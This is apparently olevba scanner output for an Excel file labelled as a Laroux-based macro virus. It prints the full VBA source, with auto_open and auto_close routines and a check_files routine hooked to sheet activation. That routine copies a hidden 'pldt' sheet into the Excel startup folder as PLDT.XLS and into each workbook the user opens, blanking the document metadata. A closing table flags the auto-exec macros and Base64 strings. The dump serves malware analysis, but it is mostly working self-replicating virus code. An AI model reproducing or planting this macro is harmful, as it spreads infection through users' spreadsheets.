olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-c6bd606008f3521ad76b93ffa9ed7103c150db4c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO pldt.bas 
in file: Virus.MSExcel.Laroux-based-c6bd606008f3521ad76b93ffa9ed7103c150db4c - OLE stream: '_VBA_PROJECT_CUR/VBA/pldt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
    
    Indexwert = 0
    For n = 1 To CommandBars.Count
       If CommandBars(n).NameLocal = "Zinsberechnung GHDK" Then
           Indexwert = n
        End If
    Next
    If Indexwert > 0 Then
        CommandBars(Indexwert).Visible = True
    Else
        MsgBox "Symbolleiste nicht gefunden !"
    End If
    
    Indexwert = 0
    For n = 1 To CommandBars.Count
        If CommandBars(n).NameLocal = "Format" Then
            Indexwert = n
        End If
    Next
    If Indexwert > 0 Then
        CommandBars(Indexwert).Visible = False
    End If

    
End Sub
Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
    Indexwert = 0
    For n = 1 To CommandBars.Count
        If CommandBars(n).NameLocal = "Zinsberechnung GHDK" Then
            Indexwert = n
        End If
    Next
    If Indexwert > 0 Then
        CommandBars(Indexwert).Visible = False
    End If
    
    
    
    Indexwert = 0
    For n = 1 To CommandBars.Count
        If CommandBars(n).NameLocal = "Format" Then
            Indexwert = n
        End If
    Next
    If Indexwert > 0 Then
        CommandBars(Indexwert).Visible = True
    End If

End Sub
Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PLDT.XLS")
    If m$ = "PLDT.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then W = 1 Else W = 0
    whichfile = p + W * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("pldt").Visible = True
    Sheets("pldt").Select
    Sheets("pldt").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PLDT.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("pldt").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "pldt" Then
        Workbooks("PLDT.XLS").Sheets("pldt").Copy Before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("pldt").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "PLDT.XLS!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  pld
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

